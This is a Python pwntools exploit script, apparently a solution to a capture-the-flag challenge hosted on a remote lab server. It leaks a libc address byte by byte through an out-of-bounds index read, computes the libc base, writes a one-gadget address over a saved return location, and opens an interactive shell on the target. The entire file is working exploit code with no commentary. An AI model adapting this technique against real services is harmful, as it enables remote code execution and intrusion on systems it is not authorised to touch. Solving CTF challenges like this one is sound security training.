#!/usr/bin/env python
from pwn import *

context.log_level='debug'

# p=process('./pwn')
p=remote('1b190bf34e999d7f752a35fa9ee0d911.kr-lab.com',57856)
sd=lambda s:p.send(s)
sl=lambda s:p.sendline(s)
ru=lambda s:p.recvuntil(s)

def debugf(payload=''):
    gdb.attach(p,payload)


ru('input your name \nname:')
sl('123')
libc_addr=''
for i in range(6):
    ru('input index\n')
    sl(str(0x278+i))
    ru('now value(hex) ')
    line=int(p.recvline().strip('\n')[-2:],16)
    print(hex(line))
    libc_addr+=p8(line)
    ru('input new value\n')
    sl('+')

libc_addr=u64(libc_addr.ljust(8,'\x00'))
# print(hex(libc_addr))
libc_base=libc_addr-0x20830
one_off=0x45216
one_off=0x4526a
one_off=0xf02a4
one_off=0xf1147
one=libc_base+one_off
one_payload=p64(one)


for i in range(6):
    ru('index\n')
    sl(str(0x158+i))
    ru('new value\n')
    sl(str(u8(one_payload[i])))

for i in range(40-5-5-1):
    ru('index\n')
    sl('0')
    ru('value\n')
    sl('0')
# debugf('nb C9B')
ru('do you want continue(yes/no)? \n')
sl('yes')

p.interactive()